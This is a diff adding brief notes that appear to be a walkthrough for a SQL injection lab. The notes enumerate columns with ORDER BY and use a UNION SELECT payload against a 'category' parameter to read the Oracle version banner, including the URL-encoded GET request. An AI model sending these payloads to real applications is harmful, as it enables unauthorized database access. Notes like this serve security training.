@@ -1,0 +1,21 @@
+# First of all check how many column are present in the select statement.
+
+select * from products where category = '1' order by 1 -- (if this statement gives 200 ok that means 1 column is selected)
+
+
+select * from products where category = '1' order by 2 -- (if this statement gives 200 ok that means 2 columns are selected in the backend's select statement)
+
+# Do this until you get any error. If order by 3 is working that means there are 3 columns and so on.
+
+# ORDER BY 1 means that the SELECT statement will display the table sorted in ascending order based on the first column.
+
+# So we have to print the version database version (refer to sql injection cheatsheet by portswigger)
+SELECT banner FROM v$version
+
+
+1' union select banner,null from v$version--
+
+# Intercept the request with burpsuite and use the given query in the form of url encoding.
+
+GET /filter?category=1'+UNION+SELECT+banner,null+FROM+v$version--
+
